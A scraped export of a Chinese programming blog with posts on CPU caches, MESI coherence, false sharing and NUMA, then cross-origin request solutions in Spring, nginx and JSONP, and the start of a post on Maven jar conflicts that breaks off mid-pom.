Socket或者Processor：指一个屋里CPU芯片，盒装的或者散装的，上面有很多针脚，直接安装在主板上。 Core：指Socket里封装的一个CPU核心，每个Core都是完全独立的计算单元，我们平时说的4核CPU，就是指一个Socket(Processor)里封装了4个Core。 HT超线程：目前Intel与AMD的Processor大多支持在一个Core里并行执行两个线程，此时在操作系统看来就相当于两个逻辑CPU(Logical Processor),在大多数情况下，我们在程序里提到CPU这个概念时，就是指一个Logical Processor。 &nbsp; &nbsp; 然后，我们先从第一个非常简单的问题开始：CPU可以直接操作内存吗？可能99%的程序员会不假思索的回答：「肯定的，不然程序怎么跑。」如果理性地分析一下，你会发现这个回答有问题：CPU与内存条是独立的两个硬件，而且CPU上也没有插槽和连线可以让内存条挂上去，也就是说，CPU并不能直接访问内存条，而是要通过主办上的其他硬件(接口)来间接访问内存条。 &nbsp; &nbsp;第二个问题：CPU的运算速度与内存条的访问速度在回见的差距究竟有多大？这个差距跟王健林「先挣它个一个亿的」小目标和「普通人有车有房」的宏大目标之间的差距相比，是更大还是更小呢？答案是：「差不多」。通常来说，CPU的运算速度与内存访问速度之间的差距不过是100倍，假如有100万RMB就可以有有房(贷)有车(贷)了没那么其100倍就刚好是一亿RMB。 &nbsp; &nbsp;既然CPU的速度与内存的速度还是存在高度两个数量级的巨大鸿沟，所有它们注定不能「幸福地在一起」，于是CPU的亲密伴侣Cache闪亮登场。与来自DRAM家族的内存(Memory)出身不同，Cache来自ASRAM家族。DRAM与SRAM最简单的区别是后者特别快，容量特别小，电路结构非常复杂，造假特别高。 &nbsp; &nbsp;造成Cache与内存之间巨大性能差距的主要原因是工作原理和结构不同，如下所述。 DRAM存储一个数据只需要一个电容加一个晶体管，SRAM则需要6个晶体管。由于DRAM的数据其实是保存在电容里的，所以每次读写过程中的充放电环节也导致了DRAM读写数据有一个延迟的问题，这个延迟通常为十几到几十ns。 内存可以看做一个二维数据，每个存储单元都有其行地址和列地址。由于SRAM的容量很小，所以存储单元的地址(行与列)比较短，可以一次性传输到SRAM中；而DRAM则需要分别传送行与列的地址。 SRAM的频率基本与CPU的频率保持一致；而DRAM的频率知道DDR4以后才开始接近CPU的频率。 &nbsp; &nbsp;Cache是被集成到CPU内部的一个存储单元，一级Cache(L1 Cache)通常只有32~64KB的容量，这个容量远远不能满足CPU大量、告诉存取的需求。此外，由于存储性能的答复提升往往伴随着价格的同步飙升，所以出于对整体成本的控制，现实中往往采用金字塔形的多级Cache体系来实现最佳缓存效果，于是出现了二级Cache(L2 Cache)及三级Cache(L3 Cache)，每一级Cache都牺牲了部分性能指标来换取更大的容量，目的是缓存更多的热点数据。以Intel家族 Intel Sandy Bridge架构的CPU为例，其L1 Cache容量为64KB，访问速度为1ns左右；L2 Cache容量扩大4倍，达到256KB，访问速度则降低到3ns左右；L3 Cache的容量则扩大512倍，达到32MB，访问速度也下降到12ns左右，即使如此，也比访问驻村的100ns(40ns+65ns)快一个数量级。此外，L3 Cache是被一个Socket上的所有CPU Core共享的，其实最早的L3 Cache被应用在AMD发布的K6-III处理器上，当时的L3 Cache受限于制造工艺，并没有被集成到CPU内部，而是集成到主板上。 &nbsp; &nbsp;从Intel Sandy Bridge CPU架构图中可以看出，CPU如果要访问内存中的数据，则要经过L1、L2、L3这三道关卡后才能抵达目的地，这个过程并不是「皇上」(CPU)亲自出马，而是交由3个级别的贵妃(Cache)们层层转发「圣旨」(内部指令)，最红抵达「后宫」(内存). 多核CPU与内存共享的问题&nbsp; &nbsp;在多核CPU的情况下，如何共享内存？ &nbsp; &nbsp;如果擅长多线程高级编程，那么肯定会毫不犹豫地给出以下伪代码： 123synchronized(memory)&#123; doSomething(...);&#125; &nbsp; &nbsp;如果真这个简单，那么这个世界上就不会只剩下两家独大的主流CPU制造商了，而且可怜的AMD一直被Intel「吊打」。 &nbsp; &nbsp;多核CPU共享内存的问题也被称为Cache一致性问题，简单地说，就是多个CPU核心所看到的Cache数据应该是一直的，在某个数据被某个CPU写入自己的Cache(L1 Cache)以后，其他CPU都应该能看到相同的Cache数据；如果自己的Cache中有旧数据，则抛弃旧数据。考虑到每个CPU有自己内存独占的Cache，所以这个问题与分布式Cache保持同步的问题是同一类问题。来自Intel的MESI协议是目前业界公认的Cache一致性问题的最佳方案，大多数SMP架构都采用这一方案，虽然该协议是一个CPU内部的协议，但由于它对我们理解内存模型及解决分布式系统的数据一致性问题有重要的参考价值，所以在这对其进行简单介绍。 &nbsp; &nbsp;Cache Line，如果有印象的话，则你会发现I/O操作从来不以字节为单位，而是以「块」为单位，这里有两个原因：首先，因为I/O操作比较慢，所以读一个字节与一个读连续N个字节所花费的时间基本相同；其次，数据访问往往具有空间连续性地特征，即我们通常会访问空间上连续的一些数据。举个例子，访问数组时通常会循环遍历，比如查找某个值或者进行比较等，如果把数组中连续的几个字节都读到内存中，那么CPU的处理速度会提升几倍。对于CPU来说，由于Memory也是慢速的外部组件，所以针对Memory的读写也采用类似I/O块的方式就不足为奇了。实际上，CPU Cache里的最小存储单元就是Cache Line，Intel CPU的一个Cache Line存储64个字节，每一级Cache都被划分为很多组Cache Line，典型的情况是4条Cache Line为一组，当Cache从Memory中加载数据时，一次加载一条Cache Line的数据。下图是Cache的结构。 &nbsp; &nbsp;每个Cache Line的头部有两个Bit来表示自身的状态，总共4种状态。 M（Modified）：修改状态，其他CPU上没有数据的副本，并且在本CPU上被修改过，与存储器中的数据不一致，最终必然会引发系统总线的写指令，将Cache Line的数据写回到Memory中。 E(Exclusive)：独占状态，表示当前Cache Line中包含的数据与Memory中的数据一致，此外，其他CPU中没有数据的副本。 S（Shared）：共享状态，表示Cache Line中包含的数据与Memory中的数据一致，而且在当前CPU和至少在其他某个CPU中有副本。 I(Invalid)：无效状态，当前Cache Line中没有有效数据或该Cache Line的数据已经失效，不能再用，当Cache要加载新数据时，优先选择此状态的Cache Line，此外，Cache Line的初始状态也是I状态。 &nbsp; &nbsp;MESI协议是用Cache Line的上述4种状态命名的，对Cache的读写操作引发了Cache Line的状态变化，因而可以理解为一种状态机模型。但MESI的复杂和独特之处在于状态的两种视角：一种是当前读写操作(Local Read/Write)所在CPU看到的自身的Cache Line状态及其他CPU上对应的Cache Line状态；另一种是一个CPU上的Cache Line状态的变迁会导致其他CPU上对应的Cache Line的状态变迁。如下所示为MESI协议的状态图。 &nbsp; &nbsp;结合状态图，我们深入分析MESI协议的一些实现细节。 &nbsp; &nbsp;（1）某个CPU(CPU A)发起本地读请求(Local Read)，比如读取某个内存地址的变量，如果此时所有的CPU的Cache中都没有加载此内存地址，即此内存地址对应的Cache Line为无效状态(Invalid)，则CPU A中的Cache会发起一个到Memory的内存Load指令，在相应的Cache Line中完成内存加载后，此Cache Line的状态会被标记位Exclusive。接下来，如果其他CPU(CPU B)在总线上也发起对同一个内存地址的读请求，则这个读请求会被CPU A 嗅探到(SNOOP),然后CPU A在内存总线上复制一份Cache Line作为应答，并将自身的Cache Line状态改为Shared，同时CPU B收到来自总线的应答并保存到自己的Cache里，也修改对应的Cache Line 状态为Shared。 &nbsp; &nbsp;(2)某个CPU(CPU A)发起本地写请求(Loacl Write),比如对某个内存地址的变量赋值，如果此时多有的CPU的Cache中都没加载此内存地址，即此内存对应的Cache Line为无效状态(Invalid)，则CPU A 中的Cache Line保存了最新的内存变量值后，其祖航太修改为Modified。随后，如果CPU B发起对同一个变量的读操作(Remote Read)，则CPU A在总线嗅探到这个读请求以后，先将Cache Line里修改过的数据回写(Write Back)到Memory中，然后在内存总线上复制一份Cache Line作为应答，最后将自身的Cache Line状态修改为Shared，由此产生的结果是CPU A与CPU B里对应的Cache Line状态都为Shared。 &nbsp; &nbsp;(3)以上面第二条内容为基础，CPU A发起本地写请求并导致自身的Cache Line状态变为Modified，如果此时CPU B 发起同一个内存地址的写请求(Remote Write)，则我们看到的状态图里此时CPU A 的Cache Line状态为Invalid 其原因如下。 &nbsp; &nbsp;CPU B此时发出的是一个特殊的请求——读并且打算修改数据，当CPU A从总线上嗅探到这个请求后，会先阻止此请求并取得总线的控制权( Takes Control of Bus)，随后将Cache Line里修改过的数据回写到Memory中，再将此Cache Line的状态修改为Invalid(这是因为其他CPU要改数据，所以没必要改为Shared)。与此同时，CPU B 发现之前的请求并没有得到响应，于是重新发起一次请求，此时由于所有的CPU的Cache里都没有内存副本了，所以CPU B的Cache就从Memory中加载最新的数据到Cache Line中，随后修改数据，然后改变Cache Line的状态为Modified。 &nbsp; &nbsp;(4)如果内存中的某个变量被多个CPU加载到各自的Cache中，从而使得变量对应的Cache Line状态为Shared，若此时某个CPU打算对此变量进行写操作，则会导致所有拥有此变量缓存的CPU的Cache Line状态都变为Invalid，这是引发性能下降的一个典型Cache Miss 问题。 &nbsp; &nbsp;在理解了MESI协议以后，我们明白了一个重要的事实，即存在多个处理器时，对共享变量的修改操作会设计多个CPU之间协调问题及Cache失效问题，这就引发了著名的「Cache伪共享」问题。 &nbsp; &nbsp;如果要访问的数据不在CPU的运算单元里，则需要从缓存中加载，如果缓存中恰好有此数据而且数据有效，就命中一次(Cache Hit)，反之产生一次Cache Miss ，此时需要从下一级缓存或主存中再次尝试加载。根据之前的分析，如果发生了Cache Miss，则数据的访问性能瞬间下降很多！在我们需要大量加载运算的情况下，数据结构、访问方式及程序运算方面是否符合「缓存友好」的设计，就成为「量变引起质变」得关键性因素了。这也是为什么最近，国外很多大数据领域的专家都热衷于研究设计和采用新一代的数据结构和算法，而其核心之一就是「缓存友好」。 著名的Cache伪共享问题&nbsp; &nbsp;Cache伪共享问题是编程中真实存在的一个问题，考虑如下所示的Java Class结构： 12345class MyObject&#123; private long a; private long b; private long c;&#125; &nbsp; &nbsp; 按照java规范,MyObject的对象是在堆内存上分配空间存储的，而且a、b、c三个属性在内存空间上是邻近，如下所示。 a(8个字节) b（8个字节） c(8个字节) &nbsp; &nbsp;我们知道，X86的CPU中Cache Line的长度为64字节，这也就意味着MyObject的3个属性(长度之和为24字节)是完全可能加载在一个Cache Line里的。如此一来，如果我们有两个不同的线程(分别运行在两个CPU上)分别同时独立修改a与b这两个属性，那么这两个CPU上的Cache Line可能出现如下所示的情况，即a与b这两个变量被放入同一个Cache Line里，并且被两个不同的CPU共享。 &nbsp; &nbsp;根据上节中MESI协议的相关知识，我们知道，如果Thread 0要对a变量进行修改，则因为CPU 1 上有对应的Cache Line ， 这会导致CPU 1 的Cache Line 无效，从而使得Thread 1 被迫重新从Memory里获取b的内容(b并没有被其他CPU改变，这样做是因为b与a在一个Cache Line里)。同样，如果Thread 1 要对b变量进行修改，则同样导致Thread 0 的Cache Line 失效，不得不重新从Memory里加载a。如此一来，本来是逻辑上无关的两个线程，完全可以在两个不同的CPU上同时执行，但阴差阳错地共享了同一个Cache Line 并相互抢占资源，导致并形成为串行，大大降低了系统的并发性，这就是所谓的Cache伪共享。 &nbsp; &nbsp;解决Cache伪共享问题的方法很简单，将a与b两个变量分到不同的Cache Line里，通常可以用一些无用的字段填充a与b之间的空隙。由于伪共享问题对性能的影响比较大，所以JDK 8 首次提供了正式的普适性的方案，即采用@Contended注解来确保一个Object或者Class里的某个属性与其他属性不在一个Cache Line里，下面的VolatileLong的多个实例之间就不会产生Cache伪共享的问题： 1234@Contendedclass VolatileLong&#123; public volatile long value = 0L;&#125; 伪共享的代码例子在代码 jvm.CacheLinePadding中，全部代码地址：SimpleTuning具体如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import java.util.concurrent.CountDownLatch;/** * @author ycc * @time 14:43 */public class CacheLinePadding &#123; private static final long count = 100000000; /** * 测试缓存行是否存在， * 这里使用InnerNo作为测试缓存行的类，缓存行默认使用64字节，这里一个long是8字节，当注释f1......后，会出现伪共享，证明缓存行的存在。 把注释打开后 耗时与不适用volatile差不多，消除了缓存行的问题， * 进而消除了伪共享问题。 */ private static class InnerNo&#123; // private long f1,f2,f3,f4,f5,f6,f7; private volatile long s =1; //private long f8,f9,f10,f11,f12,f13,f14; &#125; static InnerNo[] arr; static &#123; arr =new InnerNo[2]; arr[0]=new InnerNo(); arr[1]=new InnerNo(); &#125; public static void main(String[] args) throws InterruptedException &#123; CountDownLatch downLatch = new CountDownLatch(2); Thread t1 = new Thread(()-&gt;&#123; for (int i = 0; i &lt;count ; i++) &#123; arr[0].s = i; &#125; downLatch.countDown(); &#125;); Thread t2= new Thread(()-&gt;&#123; for (int i = 0; i &lt;count ; i++) &#123; arr[1].s = i; &#125; downLatch.countDown(); &#125;); long start = System.nanoTime(); t1.start(); t2.start(); downLatch.await(); System.out.println(&quot;耗时：&quot;+(System.nanoTime()-start)/1000000+&quot;s&quot;); &#125;&#125; 深入理解不一致性内存&nbsp; &nbsp;MESI协议解决了多核CPU下的Cache一致性问题，因而成为SMP架构的唯一选择。SMP架构近几年迅速在PC领域(X86)发展，一个CPU芯片上集成的CPU核心数量越来越多，到2017年，AMD的ZEN系列处理器就已经达到16核心32线程了。SMP架构是一种平行的结果，所有CPU Core都连接到一个内存总线上，他们平等访问内存，同时整个内存是统一结构、统一寻址的(Uniform Memory Architecture , UMA)。如下所示给出了SMP架构的示意图。 &nbsp; &nbsp;但是，随着CPU核心数量的不断增长，SMP架构也暴露其天生的短板，其根本瓶颈是共享内存总线的宽带无法满足CPU数量的增加，同时，一条「马路」上同行的「车」多了，难免陷入「拥堵模式」。在这种情况下，分布式解决方案应运而生，系统的内存与CPU进行分割并绑定在一起，形成多个独立的子系统，这些子系统之间高速互连，这就是所谓的NUMA（None Uniform Memory Architecture）架构，如下图所示： &nbsp; &nbsp;我们可以认为NUMA架构第1次打破了「大锅饭」的模式，内存不在是一个整体，而是被分割为互相独立的几块，被不同的CPU私有化(Attach到不同的CPU上)。因此，当CPU访问自身私有的内存地址时（Local Access），会很快得到响应，而如果需要访问其他CPU控制的内存数据（Remote Access），则需要通过某种互连通道（Inter-connect通道）访问，响应时间与之前相对变慢。NUMA的主要优点是伸缩性，NUMA的这种体系结构在设计上已经超越了SMP，可以扩展到几百个CPU而不会导致性能的严重下降。 &nbsp; &nbsp;NUMA技术最早出现出现在20世纪80年代，主要运行在一些大中型UNIX系统中，Sequent公司是世界公认的NUMA技术领袖。早在1986年，Sequent公司就率先利用微处理器构建大型系统，开发了基于UNIX的SMP体系结构，开创了业界转入SMP领域的先河。1999年9月，IBM公司收购了Sequent公司，将NUMA技术集成到IBM UNIX阵营中，并推出了能够支持和扩展Intel平台的NUMA-Q系统及方案，为全球大型企业客户适应高速发展的电子商务市场提供了更加多样化、高可扩展性及易于管理的选择，成为NUMA技术的领先开发者与革新者。随后很多老牌UNIX服务器厂商也采用了NUMA技术，例如IBM、Sun、惠普、Unisys、SGI等公司。2000年全球互联网泡沫破灭后，X86+Linux系统开始以低廉的成本侵占UNIX的底盘，AMD率先在其AMD Opteron 系列处理器中的X86 CPU上实现了NUMA架构，Intel也跟进并在Intel Nehalem中实现了NUMA架构（Intel服务器芯片志强E5500以上的CPU和桌面的i3、i5、i7均采用此架构），至此NUMA这个贵族技术开始真正走入平常百姓家。 &nbsp; &nbsp;下面详细分析一下NUMA技术的特点。首先，NUMA架构中引入了一个重要的新名词——Node，一个Node由一个或者多个Socket组成，即物理上的一个或多个CPU芯片组成一个逻辑上的Node。如下所示为来自Dell PowerEdge系统服务器的说明手册中的NUMA的图片，4个Intel Xeon E 5-4600处理器形成4个独立的NUMA Node，由于每个Intel Xeon E 5-4600为8Core，支持双线程，所以每个Node里的Logic CPU数量为16个，占每个Node分配系统总内存1/4，每个Node之间通过Intel QPI（QuickPath Interconnect）技术形成了点到点的全互连处理器系统。","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"跨域问题","slug":"cros","date":"2020-06-04T16:00:00.000Z","updated":"2020-10-25T08:23:25.000Z","comments":true,"path":"cros/","link":"","permalink":"https://gschaos.club/cros/","excerpt":"前后端分离跨域问题的几种解决方案.为什么会出现跨域问题?出于浏览器的同源策略限制。 同源策略（Sameoriginpolicy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。同源策略会阻止一个域的javascript脚本和另外一个域的内容进行交互。所谓同源（即指在同一个域）就是两个页面具有相同的协议（protocol），主机（host）和端口号（port） 。","text":"前后端分离跨域问题的几种解决方案.为什么会出现跨域问题?出于浏览器的同源策略限制。 同源策略（Sameoriginpolicy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。同源策略会阻止一个域的javascript脚本和另外一个域的内容进行交互。所谓同源（即指在同一个域）就是两个页面具有相同的协议（protocol），主机（host）和端口号（port） 。 跨域问题 作者：cnsyear 链接 ：https://cnsyear.com/posts/a74bc789.html 前后端分离跨域问题的几种解决方案 前后端分离跨域问题的几种解决方案 一、为什么会出现跨域问题?出于浏览器的同源策略限制。 同源策略（Sameoriginpolicy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。同源策略会阻止一个域的javascript脚本和另外一个域的内容进行交互。所谓同源（即指在同一个域）就是两个页面具有相同的协议（protocol），主机（host）和端口号（port） 。 二、什么是跨域?当一个请求url的协议、域名、端口三者之间任意一个与当前页面url不同即为跨域。 当前页面url 被请求页面url 是否跨域 原因 http://www.test.com/ http://www.test.com/index.html 否 同源（协议、域名、端口号相同） http://www.test.com/ https://www.test.com/index.html 跨域 协议不同（http/https） http://www.test.com/ http://www.baidu.com/ 跨域 主域名不同（test/baidu） http://www.test.com/ http://blog.test.com/ 跨域 子域名不同（www/blog） http://www.test.com:8080/ http://www.test.com:7001/ 跨域 端口号不同（8080/7001） 两个相同的源之间浏览器默认其是可以相互访问资源和操作DOM的。两个不同的源之间 若想要相互访问资源或者操作DOM，那么会有一套基础的安全策略的制约。具体有如下两方面的限制: 1.安全性：浏览器要防止当前站点的私密数据不会向其他站点发送 如当前站点的Cookie,LocalStorage,IndexDb不会被发送到其他站点或被其他站点脚本读取到无法跨域获取Dom，无法发送Ajax请求。 2.可用性：大型站点的图片，音视频等资源，希望部署在独立服务器上，为缓解当前服务的压力，开放某些特定的方式，访问非同源站点 如：&lt;img&gt;&lt;iframe&gt;&lt;link&gt;&lt;vedio&gt;等，可以同src属性跨域访问允许跨域提交表单/或重定向请求。 三、解决方案1.后台服务端解决方案 方法一：@CrossOrigin 123456789101112131415161718192021222324252627282930313233复制&#x2F;**注意：1、springMVC的版本要在4.2或以上版本才支持@CrossOrigin2、非@CrossOrigin没有解决跨域请求问题，而是不正确的请求导致无法得到预期的响应，导致浏览器端提示跨域问题。3、在Controller注解上方添加@CrossOrigin注解后，仍然出现跨域问题，解决方案之一就是：在@RequestMapping注解中没有指定Get、Post方式，具体指定后，问题解决。其中@CrossOrigin中的2个参数：origins ： 允许可访问的域列表maxAge：准备响应前的缓存持续的最大时间（以秒为单位）。可以配置在Controller上 也可以配置在方法上*&#x2F;@CrossOrigin@RestControllerpublic class person&#123; @RequestMapping(method &#x3D; RequestMethod.GET) public String add() &#123; &#x2F;&#x2F; 若干代码 &#125;&#125;@RestController@RequestMapping(&quot;&#x2F;account&quot;)public class AccountController &#123; @CrossOrigin @GetMapping(&quot;&#x2F;&#123;id&#125;&quot;) public Account retrieve(@PathVariable Long id) &#123; &#x2F;&#x2F; ... &#125;&#125; 方法2 12345678910111213141516171819202122232425复制package cn.pconline.pcloud.admin.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.cors.CorsConfiguration;import org.springframework.web.cors.UrlBasedCorsConfigurationSource;import org.springframework.web.filter.CorsFilter;@Configurationpublic class CorsConfig &#123; private CorsConfiguration buildConfig() &#123; CorsConfiguration corsConfiguration &#x3D; new CorsConfiguration(); corsConfiguration.addAllowedOrigin(&quot;*&quot;); &#x2F;&#x2F; 1允许任何域名使用 corsConfiguration.addAllowedHeader(&quot;*&quot;); &#x2F;&#x2F; 2允许任何头 corsConfiguration.addAllowedMethod(&quot;*&quot;); &#x2F;&#x2F; 3允许任何方法（post、get等） return corsConfiguration; &#125; @Bean public CorsFilter corsFilter() &#123; UrlBasedCorsConfigurationSource source &#x3D; new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(&quot;&#x2F;api&#x2F;**&quot;, buildConfig()); &#x2F;&#x2F; 4 return new CorsFilter(source); &#125;&#125; 2.Nginx代理服务器，反向代理接口请求1234复制location &#x2F;api&#123; rewrite ^&#x2F;api&#x2F;(.*)$ &#x2F;$1 break; proxy_pass http:&#x2F;&#x2F;localhost:8081&#x2F;;&#125; 3.jsonp方式推荐文章：说说JSON和JSONP，也许你会豁然开朗，含jQuery用例 JSONP是怎么产生的： 1、浏览器的同源策略限制，Ajax直接请求普通文件存在跨域无权限访问的问题，甭管你是静态页面、动态网页、web服务、WCF，只要是跨域请求，一律不准； 2、不过Web页面上调用js文件时则不受是否跨域的影响（不仅如此，我们还发现凡是拥有”src”这个属性的标签都拥有跨域的能力，比如、&lt;img&gt;、&lt;iframe&gt;）； 3、于是可以判断，当前阶段如果想通过纯web端（ActiveX控件、服务端代理、属于未来的HTML5之Websocket等方式不算）跨域访问数据就只有一种可能，那就是在远程服务器上设法把数据装进js格式的文件里，供客户端调用和进一步处理； 4、恰巧我们已经知道有一种叫做JSON的纯字符数据格式可以简洁的描述复杂数据，更妙的是JSON还被js原生支持，所以在客户端几乎可以随心所欲的处理这种格式的数据； 5、这样子解决方案就呼之欲出了，web客户端通过与调用脚本一模一样的方式，来调用跨域服务器上动态生成的js格式文件（一般以JSON为后缀），显而易见，服务器之所以要动态生成JSON文件，目的就在于把客户端需要的数据装入进去。 6、客户端在对JSON文件调用成功之后，也就获得了自己所需的数据，剩下的就是按照自己需求进行处理和展现了，这种获取远程数据的方式看起来非常像AJAX，但其实并不一样。 7、为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP，该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。 具体原理： 服务端提供的js脚本是动态生成的，这样调用者可以传一个参数过去告诉服务端“我想要一段调用XXX函数的js代码，请你返回给我”，于是服务器就可以按照客户端的需求来生成js脚本并响应了。 JS调用实例： 123456789101112131415161718192021复制&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;&lt;head&gt; &lt;title&gt;&lt;&#x2F;title&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; &#x2F;&#x2F; 得到航班信息查询结果后的回调函数 var flightHandler &#x3D; function(data)&#123; alert(&#39;你查询的航班结果是：票价 &#39; + data.price + &#39; 元，&#39; + &#39;余票 &#39; + data.tickets + &#39; 张。&#39;); &#125;; &#x2F;&#x2F; 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码） var url &#x3D; &quot;http:&#x2F;&#x2F;flightQuery.com&#x2F;jsonp&#x2F;flightResult.aspx?code&#x3D;CA1998&amp;callback&#x3D;flightHandler&quot;; &#x2F;&#x2F; 创建script标签，设置其属性 var script &#x3D; document.createElement(&#39;script&#39;); script.setAttribute(&#39;src&#39;, url); &#x2F;&#x2F; 把script标签加入head，此时调用开始 document.getElementsByTagName(&#39;head&#39;)[0].appendChild(script); &lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 我们看到调用的url中传递了一个code参数，告诉服务器我要查的是CA1998次航班的信息，而callback参数则告诉服务器，我的本地回调函数叫做flightHandler，所以请把查询结果传入这个函数中进行调用。OK，服务器很聪明，这个叫做flightResult.aspx的页面生成了一段这样的代码提供给jsonp.html（服务端的实现这里就不演示了，与你选用的语言无关，说到底就是拼接字符串）： 12345复制flightHandler(&#123; &quot;code&quot;: &quot;CA1998&quot;, &quot;price&quot;: 1780, &quot;tickets&quot;: 5&#125;); 我们看到，传递给flightHandler函数的是一个json，它描述了航班的基本信息。运行一下页面，成功弹出提示窗口，jsonp的执行全过程顺利完成！ JQuery调用实例： 123456789101112131415161718192021222324252627复制&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt; &lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; &gt; &lt;head&gt; &lt;title&gt;Untitled Page&lt;&#x2F;title&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; jQuery(document).ready(function()&#123; $.ajax(&#123; type: &quot;get&quot;, async: false, url: &quot;http:&#x2F;&#x2F;flightQuery.com&#x2F;jsonp&#x2F;flightResult.aspx?code&#x3D;CA1998&quot;, dataType: &quot;jsonp&quot;, jsonp: &quot;callback&quot;,&#x2F;&#x2F;传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback) jsonpCallback:&quot;flightHandler&quot;,&#x2F;&#x2F;自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写&quot;?&quot;，jQuery会自动为你处理数据 success: function(json)&#123; alert(&#39;您查询到航班信息：票价： &#39; + json.price + &#39; 元，余票： &#39; + json.tickets + &#39; 张。&#39;); &#125;, error: function()&#123; alert(&#39;fail&#39;); &#125; &#125;); &#125;); &lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 是不是有点奇怪？为什么我这次没有写flightHandler这个函数呢？而且竟然也运行成功了！哈哈，这就是jQuery的功劳了，jquery在处理jsonp类型的ajax时（还是忍不住吐槽，虽然jquery也把jsonp归入了ajax，但其实它们真的不是一回事儿），自动帮你生成回调函数并把数据取出来供success属性方法来调用，是不是很爽呀？","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]},{"title":"解决jar包冲突的简单办法","slug":"resolution jar rejected","date":"2020-05-06T16:00:00.000Z","updated":"2020-10-25T08:26:55.000Z","comments":true,"path":"resolution jar rejected/","link":"","permalink":"https://gschaos.club/resolution%20jar%20rejected/","excerpt":"解决jar包冲突的简单办法– 在使用log4j.properties时，pom中导入的一些jar会产生log4j类的冲突报错，以下是一个简单的pom配置：","text":"解决jar包冲突的简单办法– 在使用log4j.properties时，pom中导入的一些jar会产生log4j类的冲突报错，以下是一个简单的pom配置： 解决jar包冲突的简单办法场景：在使用log4j.properties时，pom中导入的一些jar会产生log4j类的冲突报错，以下是一个简单的pom配置： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263复制&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kudu&lt;&#x2F;groupId&gt; &lt;artifactId&gt;kudu-client&lt;&#x2F;artifactId&gt; &lt;version&gt;1.7.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hbase&lt;&#x2F;groupId&gt; &lt;artifactId&gt;hbase-client&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;&#x2F;groupId&gt; &lt;artifactId&gt;zookeeper&lt;&#x2F;artifactId&gt; &lt;version&gt;3.5.6&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jackson-databind&lt;&#x2F;artifactId&gt; &lt;version&gt;2.10.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.nari&lt;&#x2F;groupId&gt; &lt;artifactId&gt;front-param&lt;&#x2F;artifactId&gt; &lt;version&gt;2.9&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.oracle&lt;&#x2F;groupId&gt; &lt;artifactId&gt;ojdbc6&lt;&#x2F;artifactId&gt; 